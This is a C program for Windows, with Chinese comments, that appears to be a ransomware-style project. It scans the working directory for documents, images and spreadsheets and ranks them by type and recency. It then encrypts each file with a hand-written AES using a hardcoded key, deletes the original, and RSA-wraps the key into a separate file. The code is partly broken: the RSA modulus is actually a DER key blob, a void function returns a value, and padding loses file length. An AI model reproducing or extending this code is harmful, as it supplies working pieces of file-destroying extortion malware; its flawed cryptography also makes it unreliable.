#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <time.h>
#include <gmp.h>

void encryptFile(const char* inputFileName, const char* outputFileName, const char* key_FileName, char* password, int method); // 文件加密函数
void aes_detail(int[4][4], int[4][4], int);
void subBytes(int[4][4], int);
void shiftRows(int[4][4], int);
void mixColumns(int[4][4], int);
void addRoundKey(int[4][4], int[4][4]);
int aes_multiple(int, int);
void keyExpansion(int key[4][4], int w[11][4][4]);
int c2i(char);
void generate_key(char* key, size_t length);
void rsa_encrypt(mpz_t encrypted_key, mpz_t aes_key, mpz_t e, mpz_t n);
void mpz_to_bytes(mpz_t num, unsigned char** bytes, size_t* length);
void rsa(const char* key_FileName, char* password);
/**
 * S盒
 */
static const int S_BOX[16][16] = { 0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
                               0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
                               0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
                               0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
                               0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
                               0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
                               0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
                               0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
                               0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
                               0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
                               0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
                               0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
                               0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
                               0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
                               0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
                               0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16 };

/**
 * 逆S盒
 */
static const int INVERSE_S_BOX[16][16] = { 0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb,
                                0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb,
                                0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,
                                0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25,
                                0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92,
                                0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,
                                0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06,
                                0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,
                                0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,
                                0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,
                                0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,
                                0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,
                                0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,
                                0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef,
                                0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,
                                0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d };
int RC[10] = { 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36 };




void rsa(const char* key_FileName, char* password) {
    mpz_t e, n, aes_key, encrypted_key;
    mpz_init_set_ui(e, 65537);  // 公钥 e
    mpz_init(n);                // 模数 n
    mpz_init(aes_key);          // 存储 AES 密钥
    mpz_init(encrypted_key);    // 存储加密后的 AES 密钥

    // 假设 n 和 d 已知，这里需要替换为实际的 RSA 模数 n
    mpz_set_str(n, "305c300d06092a864886f70d0101010500034b003048024100c1f31f1dff011892d01c3117b88f96025cca2d29106547f4d17d4f9a4cfce5621c7fbd3f6dda4f1f74ef94f00a65dffe5da38b430921555f3e31d410e0bb52df0203010001", 16);  // 示例 n

    // 将 AES 密钥 "0f1571c947d9e8590cb7add6af7f6798" 转换为大数
    mpz_set_str(aes_key, password, 16);  // AES 密钥

    // 执行 RSA 加密
    rsa_encrypt(encrypted_key, aes_key, e, n);

    // 将加密后的 AES 密钥输出到文件
    FILE* key_file = fopen(key_FileName, "wb");
    if (key_file == NULL) {
        printf("Failed to open rsa.txt\n");
        return 1;
    }

    // 将加密后的大数转换为字节数组
    unsigned char* encrypted_bytes;
    size_t length;
    mpz_to_bytes(encrypted_key, &encrypted_bytes, &length);

    // 写入文件
    fwrite(encrypted_bytes, 1, length, key_file);
    fclose(key_file);

    // 释放内存
    free(encrypted_bytes);
    mpz_clear(e);
    mpz_clear(n);
    mpz_clear(aes_key);
    mpz_clear(encrypted_key);

    printf("Encryption complete, result saved in rsa.txt\n");
    return;
}

void rsa_encrypt(mpz_t encrypted_key, mpz_t aes_key, mpz_t e, mpz_t n) {
    // 使用 RSA 公钥加密 AES 密钥
    mpz_powm(encrypted_key, aes_key, e, n);
}

void mpz_to_bytes(mpz_t num, unsigned char** bytes, size_t* length) {
    // 获取 num 的字节长度
    *length = (mpz_sizeinbase(num, 2) + 7) / 8;  // 计算需要多少字节
    *bytes = malloc(*length);  // 分配内存

    // 将 num 转换为字节数组
    mpz_export(*bytes, length, 1, sizeof(unsigned char), 1, 0, num);
}
//密钥生成函数
void generate_key(char* key, size_t length) {
    const char* hex_chars = "0123456789abcdef";
    for (size_t i = 0; i < length; ++i) {
        key[i] = hex_chars[rand() % 16]; // 取 0-15 的随机数，映射到十六进制字符
    }
    key[length] = '\0'; // 添加字符串结束符
}

// 文件加密函数
void encryptFile(const char* inputFileName, const char* outputFileName, const char* key_FileName, char* password, int method) {
    FILE* inputFile = fopen(inputFileName, "rb"); // 以二进制只读模式打开原始文件
    if (inputFile == NULL) {
        printf("fail to open the file%s\n", inputFileName); // 打开失败提示
        return;
    }

    FILE* outputFile = fopen(outputFileName, "wb"); // 以二进制写入模式创建加密文件
    if (outputFile == NULL) {
        printf("fail to creat the file%s\n", outputFileName); // 创建失败提示
        fclose(inputFile); // 关闭已打开的原始文件
        return;
    }

    FILE* key_file = fopen(key_FileName, "wb");  // 以附加模式打开文件
    if (key_file == NULL) {
        printf("Failed to open the key file.\n");
        fclose(inputFile); // 关闭已打开的原始文件
        return;
    }

    // 初始化 AES 密钥
    int key[4][4]; // 生成密钥矩阵
    for (int m = 0; m < 4; ++m) {
        for (int i = 0; i < 4; ++i) {
            int indx = 4 * i + m;
            key[i][m] = 16 * c2i(password[indx]) + c2i(password[indx + 1]);
        }
    }

    unsigned char block[16];
    size_t bytes_read;
    while ((bytes_read = fread(block, 1, 16, inputFile)) > 0) {
        // 如果读取的字节不足 16 字节，则进行填充
        if (bytes_read < 16) {
            memset(block + bytes_read, 0, 16 - bytes_read); // 填充 0
            printf("1");
        }
        // 将块数据转换为 int 类型的二维数组
        int block_int[4][4];
        for (int i = 0; i < 4; ++i) {
            for (int j = 0; j < 4; ++j) {
                block_int[i][j] = block[i * 4 + j];
            }
        }
        aes_detail(block_int, key, method); // 1 表示加密

        for (int i = 0; i < 4; ++i) {
            for (int j = 0; j < 4; ++j) {
                block[i * 4 + j] = block_int[i][j];  // 更新块数据
            }
        }

        fwrite(block, 16, 1, outputFile);  // 写入 16 字节加密后的数据

    }



    printf("\nsuccees\n"); // 加密成功提示
    fclose(inputFile);         // 关闭原始文件
    fclose(outputFile);        // 关闭加密文件
    remove(inputFileName);    //删除原文件
}

void aes_detail(int content[4][4], int password[4][4], int encode) {
    int p[11][4][4];
    keyExpansion(password, p);

    if (encode) {
        addRoundKey(content, p[0]);
        for (int i = 1; i <= 10; ++i) {
            subBytes(content, encode);
            shiftRows(content, encode);
            if (i != 10) {
                mixColumns(content, encode);
            }

            addRoundKey(content, p[i]);
        }
    }
    else {
        addRoundKey(content, p[10]);
        for (int i = 9; i >= 0; --i) {
            shiftRows(content, encode);
            subBytes(content, encode);
            addRoundKey(content, p[i]);
            if (i != 0) {
                mixColumns(content, encode);
            }
        }
    }
}

void subBytes(int a[4][4], int encode) {
    // encode 为1 代表字节替代，为0代表逆向字节替代
    for (int i = 0; i < 4; ++i) {
        for (int j = 0; j < 4; ++j) {
            int temp = a[i][j];
            int row = temp / 16;
            int column = temp % 16;
            if (encode)
                a[i][j] = S_BOX[row][column];
            else
                a[i][j] = INVERSE_S_BOX[row][column];
        }
    }
}

void shiftRows(int a[4][4], int encode) {
    //encode 为1代表行移位，为0代表逆向行移位
    for (int i = 0; i < 4; ++i) {
        for (int j = 0; j < i; ++j) {
            if (encode) {
                int temp = a[i][0];
                a[i][0] = a[i][1];
                a[i][1] = a[i][2];
                a[i][2] = a[i][3];
                a[i][3] = temp;
            }
            else {
                int temp = a[i][3];
                a[i][3] = a[i][2];
                a[i][2] = a[i][1];
                a[i][1] = a[i][0];
                a[i][0] = temp;
            }
        }
    }
}

void mixColumns(int a[4][4], int encode) {
    //encode 为1代表列混淆，为0代表逆向列混淆
    for (int i = 0; i < 4; ++i) {
        int temp0 = a[0][i];
        int temp1 = a[1][i];
        int temp2 = a[2][i];
        int temp3 = a[3][i];
        if (encode) {
            a[0][i] = aes_multiple(temp0, 2) ^ aes_multiple(temp1, 3) ^ temp2 ^ temp3;
            a[1][i] = temp0 ^ (aes_multiple(temp1, 2)) ^ (temp2 ^ aes_multiple(temp2, 2)) ^ temp3;
            a[2][i] = temp0 ^ temp1 ^ (aes_multiple(temp2, 2)) ^ (temp3 ^ aes_multiple(temp3, 2));
            a[3][i] = temp0 ^ (aes_multiple(temp0, 2)) ^ temp1 ^ temp2 ^ aes_multiple(temp3, 2);
        }
        else {
            a[0][i] = aes_multiple(temp0, 14) ^ aes_multiple(temp1, 11) ^ aes_multiple(temp2, 13) ^ aes_multiple(temp3, 9);
            a[1][i] = aes_multiple(temp0, 9) ^ aes_multiple(temp1, 14) ^ aes_multiple(temp2, 11) ^ aes_multiple(temp3, 13);
            a[2][i] = aes_multiple(temp0, 13) ^ aes_multiple(temp1, 9) ^ aes_multiple(temp2, 14) ^ aes_multiple(temp3, 11);
            a[3][i] = aes_multiple(temp0, 11) ^ aes_multiple(temp1, 13) ^ aes_multiple(temp2, 9) ^ aes_multiple(temp3, 14);
        }
    }
}

void addRoundKey(int a[4][4], int k[4][4]) {
    // 由于用w[11][4][4]表示W[44]导致行列转置，所以在进行异或操作的时候应该是a[i，j] 异或 k[j,i]
    for (int i = 0; i < 4; ++i) {
        for (int j = 0; j < 4; ++j) {
            a[i][j] = a[i][j] ^ k[j][i];
        }
    }
}

//AES乘法计算
int aes_multiple(int a, int le) {
    int thr = le & 0x8;
    int sec = le & 0x4;
    int fir = le & 0x2;
    int fir_mod = le % 2;
    int result = 0;
    if (thr) {
        int b = a;
        for (int i = 1; i <= 3; ++i) {
            b = b << 1;
            if (b >= 256)
                b = b ^ 0x11b;
        }
        b = b % 256;
        result = result ^ b;
    }
    if (sec) {
        int b = a;
        for (int i = 1; i <= 2; ++i) {
            b = b << 1;
            if (b >= 256)
                b = b ^ 0x11b;
        }
        b = b % 256;
        result = result ^ b;
    }
    if (fir) {
        int b = a << 1;
        if (b >= 256)
            b = b ^ 0x11b;
        b = b % 256;
        result = result ^ b;
    }
    if (fir_mod)
        result = result ^ a;
    return  result;
}

void keyExpansion(int key[4][4], int w[11][4][4]) {
    for (int i = 0; i < 4; ++i) {
        for (int j = 0; j < 4; ++j) {
            w[0][i][j] = key[j][i];
        }
    }
    for (int i = 1; i < 11; ++i) {
        for (int j = 0; j < 4; ++j) {
            int temp[4];
            if (j == 0) {
                temp[0] = w[i - 1][3][1];
                temp[1] = w[i - 1][3][2];
                temp[2] = w[i - 1][3][3];
                temp[3] = w[i - 1][3][0];
                for (int k = 0; k < 4; ++k) {
                    int m = temp[k];
                    int row = m / 16;
                    int column = m % 16;
                    temp[k] = S_BOX[row][column];
                    if (k == 0) {
                        temp[k] = temp[k] ^ RC[i - 1];
                    }
                }
            }
            else {
                temp[0] = w[i][j - 1][0];
                temp[1] = w[i][j - 1][1];
                temp[2] = w[i][j - 1][2];
                temp[3] = w[i][j - 1][3];
            }
            for (int l = 0; l < 4; ++l) {

                w[i][j][l] = w[i - 1][j][l] ^ temp[l];
            }

        }
    }

}

//将字符转换为数值


int c2i(char ch) {
    // 如果是数字字符，则返回对应的数字值
    if (isdigit(ch)) {
        return ch - '0'; // 更直接的方式，'0'的ASCII值是48
    }

    // 如果是字母字符，且在 A-F 或 a-f 范围内，则返回对应的十六进制值
    if (isalpha(ch)) {
        if (ch >= 'A' && ch <= 'F') {
            return ch - 'A' + 10;  // 大写字母 A-F
        }
        else if (ch >= 'a' && ch <= 'f') {
            return ch - 'a' + 10;  // 小写字母 a-f
        }
    }

    // 如果不是合法的十六进制字符，返回 -1
    return -1;
}

// 定义结构体来存储文件信息
typedef struct {
    char name[1024];        // 记录文件名称
    time_t mtime;           // 记录文件修改时间
    int file_type_priority; // 标记文件类型优先级
} FileInfo;

// 用于 qsort，根据文件修改时间排序（降序）
int compare_file_info(const void *a, const void *b)
{
    const FileInfo *fileA = (const FileInfo *)a;
    const FileInfo *fileB = (const FileInfo *)b;

    if (fileA->mtime > fileB->mtime) {
        return -1;
    } else if (fileA->mtime < fileB->mtime) {
        return 1;
    } else {
        return 0;
    }
}

// 用于 qsort，根据文件类型优先级排序
int compare_file_type_priority(const void *a, const void *b)
{
    const FileInfo *fileA = (const FileInfo *)a;
    const FileInfo *fileB = (const FileInfo *)b;

    return fileA->file_type_priority - fileB->file_type_priority;
}

// 根据文件扩展名确定文件类型优先级
int get_file_type_priority(const char *name)
{
    const char *extensions[] = {".docx", ".doc", ".pptx", ".ppt", ".jpg", ".png", ".gif", ".xlsx", ".xls", ".pdf", ".exe", ".c", ".ppp", ".py"};
    int num_extensions = sizeof(extensions) / sizeof(extensions[0]);

    // docx 和 doc 为同一优先级
    if (_stricmp(name + strlen(name) - 5, ".docx") == 0 || _stricmp(name + strlen(name) - 4, ".doc") == 0) {
        return 0;
    }
    // pptx 和 ppt
    else if (_stricmp(name + strlen(name) - 5, ".pptx") == 0 || _stricmp(name + strlen(name) - 4, ".ppt") == 0) {
        return 1;
    }
    // jpg、png 和 gif 
    else if ((_stricmp(name + strlen(name) - 4, ".jpg") == 0) || (_stricmp(name + strlen(name) - 4, ".png") == 0) || (_stricmp(name + strlen(name) - 4, ".gif") == 0)) {
        return 2;
    }
    // xlsx 和 xls 
    else if (_stricmp(name + strlen(name) - 5, ".xlsx") == 0 || _stricmp(name + strlen(name) - 4, ".xls") == 0) {
        return 3;
    }

    // 处理其他单个扩展名
    for (int i = 0; i < num_extensions; i++) {
        size_t len_extension = strlen(extensions[i]);
        if (_stricmp(name + strlen(name) - len_extension, extensions[i]) == 0) {
            return i;
        }
    }

    return num_extensions; // 返回大于所有已知优先级的值，表示其他类型，优先级最低
}

// 将 FILETIME 转换为 time_t
time_t filetime_to_timet(const FILETIME *ft)
{
    ULARGE_INTEGER ui;
    ui.LowPart = ft->dwLowDateTime;
    ui.HighPart = ft->dwHighDateTime;
    return (time_t)(ui.QuadPart - 116444736000000000ull) / 10000000;
}

// 遍历路径函数，填充文件信息结构体数组，并标记文件_type 优先级
void traverse_path(const char *path, FileInfo *fileInfos, int *count, int depth)
{
    WIN32_FIND_DATA findFileData;
    HANDLE hFind;

    char dirPath[1024];
    snprintf(dirPath, sizeof(dirPath), "%s\\*", path);

    hFind = FindFirstFile(dirPath, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE)
    {
        printf("无法打开目录\n");
        return;
    }

    do
    {
        if (strcmp(findFileData.cFileName, ".")!= 0 && strcmp(findFileData.cFileName, "..")!= 0)
        {
            // 构建完整文件路径
            char file_path[1024];
            snprintf(file_path, sizeof(file_path), "%s\\%s", path, findFileData.cFileName);

            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                // 递归遍历子目录
                if(depth<3)
                traverse_path(file_path, fileInfos, count,depth+1);
            }
            else
            {
                // 将普通文件信息存入结构体数组
                strcpy(fileInfos[*count].name, findFileData.cFileName);
                fileInfos[*count].mtime = filetime_to_timet(&findFileData.ftLastWriteTime);
                fileInfos[*count].file_type_priority = get_file_type_priority(findFileData.cFileName);
                (*count)++;
            }
        }
    } while (FindNextFile(hFind, &findFileData)!= 0);

    FindClose(hFind);
}

int main()
{
    // 获取当前工作目录作为路径
    char path[1024];
    if (GetCurrentDirectoryA(sizeof(path), path) == 0) {
        printf("获取当前路径失败\n");
        return 1;
    }

    // 定义结构体数组来存储文件信息
    FileInfo fileInfos[1024];
    int count = 0;

    for (int i = 0; i < 1024; i++) {
        fileInfos[i].name[0] = '\0';
        fileInfos[i].mtime = 0;
        fileInfos[i].file_type_priority = -1; // 初始化文件_type 优先级为未知
    }

    traverse_path(path, fileInfos, &count, 0);

    // 先按照文件类型优先级排序
    qsort(fileInfos, count, sizeof(FileInfo), compare_file_type_priority);

    // 记录当前处理的文件_type 优先级
    int current_file_type_priority = -1;

    // 遍历排序后的文件信息，对每种类型的文件再按照时间排序并输出
    for (int i = 0; i < count; i++) {
        if (fileInfos[i].file_type_priority!= current_file_type_priority) {
            if (current_file_type_priority == -1 && fileInfos[i].file_type_priority == 0) {
                printf("\nWord 文档（.docx、.doc）信息如下：\n");
            } else if (current_file_type_priority == -1) {
                printf("排序后的文件信息如下：\n");
            } else if (fileInfos[i].file_type_priority == 1) {
                printf("\nPowerPoint 文档（.pptx、.ppt）信息如下：\n");
            } else if (fileInfos[i].file_type_priority == 2) {
                printf("\n图片（.jpg、.png、.gif）信息如下：\n");
            } else if (fileInfos[i].file_type_priority == 3) {
                printf("\nExcel 文档（.xlsx、.xls）信息如下：\n");
            } else if (fileInfos[i].file_type_priority == get_file_type_priority(".pdf")) {
                printf("\nPDF 文档（.pdf）信息如下：\n");
            } else if (fileInfos[i].file_type_priority == get_file_type_priority(".exe")) {
                printf("\n可执行文件（.exe）信息如下：\n");
            } else if (fileInfos[i].file_type_priority == get_file_type_priority(".c")) {
                printf("\nC 语言源文件（.c）信息如下：\n");
            } else if (fileInfos[i].file_type_priority == get_file_type_priority(".ppp")) {
                printf("\nPPP 文件（.ppp）信息如下：\n");
            } else if (fileInfos[i].file_type_priority == get_file_type_priority(".py")) {
                printf("\nPython 源文件（.py）信息如下：\n");
            } else if (fileInfos[i].file_type_priority == -1) {
                // 遇到文件夹时不做额外输出，保持不动
                continue;
            } else {
                // 对于其他不在预定义类型中的文件，输出换行
                printf("其他类型文件信息如下：\n");
            }
            current_file_type_priority = fileInfos[i].file_type_priority;

            // 对当前类型的文件按照时间排序（降序）
            int start_index = i;
            int end_index = i;
            while (end_index < count && fileInfos[end_index].file_type_priority == current_file_type_priority) {
                end_index++;
            }
            qsort(&fileInfos[start_index], end_index - start_index, sizeof(FileInfo), compare_file_info);
        }

        char time_str[20];
        
        strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", localtime(&fileInfos[i].mtime));
        printf("文件名：%s，修改时间：%s\n", fileInfos[i].name, time_str);
    }
    printf("文件处理完成\n");
    
    char output_filename[256] = {0};
    char key_filename[256] ={0};

    int method = 1;

    srand((unsigned int)time(NULL)); // 初始化随机种子

    char* key = "0f1571c947d9e8590cb7add6af7f6798";
    //generate_key(key, 32);
    for (int i = 0;i < count;i++)
    {
        printf("enter file name");
        fgets(fileInfos[i].name, sizeof(fileInfos[i].name), stdin);


        printf("enter output name");
        fgets(output_filename, sizeof(output_filename), stdin);
        output_filename[strcspn(output_filename, "\n")] = 0;

        printf("enter key name");
        fgets(key_filename, sizeof(key_filename), stdin);
        key_filename[strcspn(key_filename, "\n")] = 0;

        encryptFile(fileInfos[i].name, output_filename, key_filename, key, method);

        rsa(key_filename, key);

       
    }// 暂停以便查看输出
    system("pause");
    return 0;


 }
